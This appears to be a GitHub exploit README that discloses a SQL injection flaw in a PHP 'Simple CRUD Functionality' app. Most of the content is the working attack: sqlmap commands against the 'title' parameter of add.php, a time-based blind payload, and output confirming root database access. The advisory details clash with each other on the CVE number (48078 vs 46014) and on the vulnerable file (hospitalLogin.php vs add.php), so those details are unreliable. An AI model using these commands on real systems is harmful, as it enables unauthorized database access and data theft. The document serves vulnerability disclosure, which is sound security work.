# Simple-CRUD-Functionality-SQLi-POC - CVE-2023-48078
+ Exploit Author: esasadam06
# Vendor Homepage
+ https://code-projects.org/simple-crud-functionality-in-php-with-source-code
# Software Link
+ https://download.code-projects.org/details/8e863682-a839-4645-94e0-ae769c83635d
# Overview
+ Simple CRUD Functionality SQLi POC is susceptible to a significant security vulnerability that arises from insufficient protection on the 'title' parameters in the hospitalLogin.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ CVE ID: CVE-2023-46014
+ Affected Version: Simple CRUD Functionality V1.0
+ Vulnerable File: /add.php
+ Parameter Names: title
+ Attack Type: Local
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48078
+ https://nvd.nist.gov/vuln/detail/CVE-2023-48078
# Description
+ The lack of proper input validation and sanitization on the 'title' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database


# Proof of Concept (PoC) : 
+ `sqlmap -u 'http://localhost/CRUD-Operation/add.php' -p 'title' --data="title=test&descr=test&sub=" --risk=3 --level=3 --method='POST' -D 'crud'`

```
---
Parameter: title (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: title=test' RLIKE SLEEP(5) AND 'FxIv'='FxIv&descr=test&sub=
---
```
+ `sqlmap -u 'http://localhost/CRUD-Operation/add.php' -p 'title' --data="title=test&descr=test&sub=" --risk=3 --level=3 --method='POST' -D 'crud' -T 'notes' --is-dba --current-user`

```
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: title=test' RLIKE SLEEP(5) AND 'FxIv'='FxIv&descr=test&sub=
---

root@localhost
current user: 'root@localhost'
```
![image](https://github.com/esasadam06/Simple-CRUD-Functionality-SQLi-POC/assets/48632551/f1ce31be-d8dd-408b-87c1-a37d6cd76448)
